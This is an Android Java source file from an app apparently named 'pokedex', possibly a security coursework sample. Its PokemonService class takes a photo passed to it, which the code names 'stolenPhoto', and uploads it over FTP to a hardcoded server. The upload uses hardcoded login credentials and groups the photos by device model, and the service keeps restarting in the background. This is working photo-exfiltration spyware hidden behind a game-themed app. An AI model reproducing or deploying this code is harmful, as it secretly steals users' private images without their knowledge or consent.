package com.seginf.pokedex;

import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.os.Build;
import android.os.IBinder;
import android.os.Parcelable;
import android.os.StrictMode;
import android.util.Log;

import org.apache.commons.net.ftp.FTPClient;

import java.io.BufferedInputStream;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;


public class PokemonService extends Service {

    private static String TAG = "PokemonService";
    private static String SEND_RESULT_API_HOST = "10.2.200.89";

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "creating pokemon service");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        if (intent == null) return 0;

        Parcelable photo = intent.getParcelableExtra("photo");

        if (photo == null || !(photo instanceof Bitmap)) {
            Log.d(TAG, "photo was null or not a bitmap");
            return 0;
        }

        Log.d(TAG, "received bitmap!!");

        sendToServer((Bitmap) photo);

        return Service.START_STICKY;
    }

    private void sendToServer(final Bitmap stolenPhoto) {

        if (android.os.Build.VERSION.SDK_INT > 9) {
            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
            StrictMode.setThreadPolicy(policy);
        }

        new Thread(new Runnable() {
            @Override
            public void run() {
                FTPClient ftpClient = new FTPClient();

                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                stolenPhoto.compress(Bitmap.CompressFormat.PNG, 100, byteArrayOutputStream);
                byteArrayOutputStream.toByteArray();

                try {
                    ftpClient.connect(SEND_RESULT_API_HOST);
                    ftpClient.login("partu", "caca");
                    String workingDirectory = "server/photos" + Build.MODEL;
                    boolean directoryResult = ftpClient.changeWorkingDirectory(workingDirectory);

                    if (!directoryResult) {
                        ftpClient.makeDirectory(workingDirectory);
                        ftpClient.changeWorkingDirectory(workingDirectory);
                    }

                    String name = Double.toString(Math.random());
                    Log.d(TAG, ftpClient.getReplyString());
                    String response = ftpClient.getReplyString();
                    if (response.contains("230") || response.contains("250")) {
                        ftpClient.setFileType(org.apache.commons.net.ftp.FTP.BINARY_FILE_TYPE);
                        BufferedInputStream buffIn;
                        InputStream is = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
                        buffIn = new BufferedInputStream(is);
                        ftpClient.enterLocalPassiveMode();
                        boolean result = ftpClient.storeFile(name, buffIn);
                        Log.d(TAG, "resultado del store " + result);
                        buffIn.close();
                        ftpClient.logout();
                        ftpClient.disconnect();
                    }

                } catch (Exception e) {
                    e.printStackTrace();
                    Log.d(TAG, "EXCEPTION IN sendToServer");
                }
            }
        }).run();
    }
}
